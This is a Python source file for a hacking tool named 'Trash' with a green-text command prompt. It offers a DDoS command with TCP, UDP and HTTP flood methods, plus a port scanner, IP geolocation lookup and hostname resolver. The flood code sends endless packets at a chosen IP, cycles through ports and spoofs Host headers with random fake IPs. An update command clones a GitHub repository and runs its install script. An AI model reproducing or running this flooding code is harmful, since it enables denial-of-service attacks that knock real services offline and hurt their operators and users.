import os
import sys
import socket
import random
import time
import string
import random
import platform
import requests
import threading
import colorama
from colorama import Fore, init
init()

useragents = []
def user_agent():
    global useragents
    useragents.append('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')
    useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
    useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
    useragents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
    useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko')
    useragents.append('Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0')
    useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1')
    useragents.append('Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0')
    useragents.append('Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16')
    useragents.append('Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02')
    useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246')
    useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1')
    useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0')
    useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36')
    useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36')
    useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7')
    return useragents

def cls():
    os.system('cls' if os.name=='nt' else 'clear')

def banner():
    cls()
    print(Fore.LIGHTWHITE_EX + "")
    print('######## ########     ###     ######  ##     ##')
    print('   ##    ##     ##   ## ##   ##    ## ##     ##')
    print('   ##    ##     ##  ##   ##  ##       ##     ##') 
    print('   ##    ########  ##     ##  ######  #########')
    print('   ##    ##   ##   #########       ## ##     ##') 
    print('   ##    ##    ##  ##     ## ##    ## ##     ##') 
    print('   ##    ##     ## ##     ##  ######  ##     ##\n')
    print(Fore.WHITE + "[*] Coded by: Raven")
    print("[*] Version: 1.0\n" + Fore.LIGHTWHITE_EX + "")

def main():
    banner()
    print("To see all commands, type <help>\n")
    print('%sroot@trash: $ ' % (Fore.LIGHTGREEN_EX), end='') 
    global command
    command = input()

    if('ddos' in command.lower()):
        ddos()
    if('portscan' in command.lower()):
        portscan()
    if('lookup' in command.lower()):
        lookup()
    if('hostip' in command.lower()):
        hostip()
    if('help' in command.lower()):
        helpp()

def ddos():
    banner()

    cmd_command = command.split(" ")
    ip = cmd_command[1]
    method = cmd_command[2]
    powerr = cmd_command[3]
    power = int(powerr)
    portt = cmd_command[4]
    port = int(portt)

    if(port > 65533):
        banner()
        print(Fore.LIGHTRED_EX + "[-] Port can't be bigger than 65533!")
        time.sleep(1)
        main()

    print(Fore.LIGHTGREEN_EX + "---------- ATTACK SUMMARY ----------")
    print(f"[*] Attacked IP: {ip}\n[*] Used method: {method}\n[*] Power: {power}\n[*] Port: {port}")
    print("------------------------------------" + Fore.RESET)
    input()

    if (method == 'tcp'.lower()):
        banner()
        class Socks(threading.Thread):
            def run(self):
                while True:
                    try:
                        print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
                        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        packet = "GET / HTTP/1.1\n Host: " + ip + "\n\n User-Agent:" + random.choice(user_agent())
                        soc.connect((ip, int(portt)))
                        soc.sendto(packet, (ip, int(portt)))
                    except socket.error:
                        print(Fore.LIGHTRED_EX + f"[-] Error while sending a packet! {ip} might be down!")
                        time.sleep(1)
                        pass
        print(Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
        while True:
            th1 = Socks()
            th1.start()

    if (method == 'udp'.lower()):
        banner()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        sent = 0
        try:
            while True:
                for x in range(power):
                    sock.sendto(bytes, (ip,port))
                sent = sent + 1
                port = port + 1
                if port == 65534:
                    port = 1
                print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
        except socket.error:
            print(Fore.LIGHTRED_EX + f"[-] Error while sending a packet! {ip} might be down!")
            time.sleep(0.5)
            pass
    
    if (method == 'http'.lower()):
        banner()
        while True:
            #fake ips generator
            part1 = random.randint(1, 255)
            part2 = random.randint(1, 255)
            part3 = random.randint(1, 255)
            part4 = random.randint(1, 255)
            fake_ip = f'{part1}.{part2}.{part3}.{part4}'

            try:
                print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port} " + Fore.GREEN + f"[Used IP: {fake_ip}]")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
                s.close()
            except:
                print(Fore.LIGHTRED_EX + f"[-] Error while sending a packet! {ip} might be down!")
                pass

    print("Invalid method!")
    time.sleep(1)
    main()

def portscan():
    banner()
    cmd_command = command.split(" ")
    hostt = cmd_command[1]
    host = socket.gethostbyname(hostt)
    socket.setdefaulttimeout(2)
    print(Fore.LIGHTWHITE_EX + "\n[*] Scanning: " + hostt)
    host=socket.gethostbyname(host)
    print ("[*] IP of host: " + host + "\n")
    ports=[1,5,7,18,20,21,22,23,25,43,42,53,80,109,110,115,118,443,194,161,445,156,137,139,3306]
    variable = 0
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((host, port))
        if result == 0:
            print (Fore.LIGHTGREEN_EX + "[+] Port {} is open!".format(port))
            variable += 1
        sock.close()
    print(Fore.LIGHTWHITE_EX + "\n[*] Scanning ended!")
    input()
    main()

def lookup():
    banner()
    cmd_command = command.split(" ")
    ip = cmd_command[1]
    url = (f'https://ipinfo.io/{ip}/json/')
    data = requests.get(url).json()
    if('error' in data):
        print(Fore.LIGHTRED_EX + "[-] This IP does not exist.")
        time.sleep(1)
        main()
    else:
        print(Fore.LIGHTWHITE_EX + "Data from " + ip + ":")
        print("\n[*] IP: " + data['ip'])
        print("[*] Host: " + data['hostname'])
        print("[*] Internet company: " + data['org'])
        print("[*] Country: " + data['country'])
        print("[*] City: " + data['city'])
        print("[*] Postal code: " + data['postal'])
        print("[*] Location: " + data['loc'])
        input()
        main()

def hostip():
    banner()
    cmd_command = command.split(" ")
    host = cmd_command[1]
    iphost = socket.gethostbyname(host)
    print(Fore.LIGHTWHITE_EX + f"\n[*] IP of {host}: {iphost}")
    input()
    main()

def update():
    banner()
    print("\nChecking for updates...")
    os.system("git clone https://github.com/Raven141/Trash.git")
    os.system("./install.sh")
    print(Fore.LIGHTGREEN_EX + "\n[+] Trash updated to the newest version!")
    time.sleep(1)
    main()

def helpp():
    banner()
    print(Fore.LIGHTWHITE_EX + "\nddos - used for flooding specific host")
    print("AVAILABLE METHODS: TCP, UDP, HTTP")
    print("Usage: ddos <ip/website> <method> <power> <port>")
    print("\nportscan - used for scanning for open ports")
    print("Usage: portscan <host>")
    print("\nlookup - used for obtaining specific info about IP")
    print("Usage: lookup <ip>")
    print("\nhostip - used for getting IPs of websites")
    print("Usage: hostip <ip>")
    print("\nupdate - updates Trash to the newest version")
    print("Usage: update")
    input()
    main()

main()